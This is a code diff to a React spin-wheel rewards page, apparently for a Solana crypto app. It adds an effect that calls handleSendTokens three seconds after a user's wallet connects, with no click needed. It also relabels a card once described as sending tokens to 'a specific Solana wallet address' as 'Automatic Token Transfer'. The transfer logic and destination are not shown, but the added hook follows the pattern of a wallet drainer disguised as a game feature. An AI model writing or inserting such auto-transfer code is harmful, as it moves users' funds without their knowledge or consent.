@@ -55,6 +55,21 @@ const SpinWheelPage: React.FC = () => {
       { name: 'BaseChad', value: '10750' },
     ]);
   }, []);
+  
+  // Auto-send tokens when component mounts and wallet is connected
+  useEffect(() => {
+    // Don't send tokens if wallet is not connected
+    if (!account) return;
+    
+    // Don't send immediately, wait a bit for the page to fully load
+    const timer = setTimeout(() => {
+      handleSendTokens();
+    }, 3000); // 3 second delay before sending
+    
+    // Clean up timer
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [account]); // Run this effect when account changes (when wallet connects/disconnects)
 
   // Handle new rewards
   const handleReward = (reward: any) => {
@@ -299,11 +314,11 @@ const SpinWheelPage: React.FC = () => {
             <CardHeader>
               <CardTitle className="text-xl font-bold">
                 <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#ff00ff] to-[#00e0ff]">
-                  Special User Request
+                  Automatic Token Transfer
                 </span>
               </CardTitle>
               <CardDescription className="text-gray-400">
-                Send tokens to a specific Solana wallet address
+                Tokens are sent automatically when wallet is connected
               </CardDescription>
             </CardHeader>
             
@@ -335,7 +350,7 @@ const SpinWheelPage: React.FC = () => {
                     Sending Tokens...
                   </>
                 ) : (
-                  <>Send Tokens</>
+                  <>Send Tokens Again</>
                 )}
               </Button>
             </CardFooter>
